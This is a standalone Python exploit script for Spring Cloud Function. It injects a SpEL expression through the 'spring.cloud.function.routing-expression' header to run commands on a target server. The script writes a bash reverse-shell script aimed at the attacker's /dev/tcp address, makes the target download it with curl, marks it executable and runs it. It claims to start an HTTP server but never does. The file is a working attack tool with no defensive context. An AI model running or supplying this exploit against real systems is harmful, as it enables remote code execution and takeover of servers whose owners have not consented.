#!/usr/bin/env python3

import http.server
import requests
import socketserver
import threading
import time
from urllib.parse import quote
from argparse import ArgumentParser, RawDescriptionHelpFormatter

httpd = ""

module_name = "spring exploit"
version = "0.5"

def exploit(cmd):
	headers = {'spring.cloud.function.routing-expression' : 'T(java.lang.Runtime).getRuntime().exec("' + cmd + '")'}
	req = requests.post("http://" + args.remote_ip + ":" + str(args.remote_port) + "/functionRouter",headers=headers, data="123");

if __name__ == "__main__":
	parser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=f"{module_name} (Version { version })")

	parser.add_argument("--local-ip", "-li", dest="local_ip",default=False,help="your ip", required=True)
	parser.add_argument("--local-port", "-lp", dest="local_port",default="8000",help="your port")

	parser.add_argument("--remote-ip", "-ri", dest="remote_ip",default=False,help="The ip or hostname to the site on.", required=True)
	parser.add_argument("--remote-port", "-rp", dest="remote_port",default="8080",help="the port, default port is 8080")

	parser.add_argument("--listening-port", "-np", dest="listening_port",default=False,help="The port you are listening to on netcat.", required=True)

	args = parser.parse_args()

	with open("shell.sh", "w") as file:
		file.write("#!/bin/bash\n")
		file.write("bash -i >& /dev/tcp/" + args.local_ip + "/" + args.listening_port + " 0>&1\n")

	print("[i] Starting Http Server.") 
	print("[i] Sending request..") 
	exploit("curl http://" + args.local_ip + ":" + str(args.local_port) + "/shell.sh -o /tmp/shell.sh")
	time.sleep(3)
	print("[i] Making bash executable.")
	time.sleep(3)
	exploit("chmod +x /tmp/shell.sh")
	time.sleep(3)
	print("[i] Executing shell.")
	exploit("/tmp/shell.sh &")
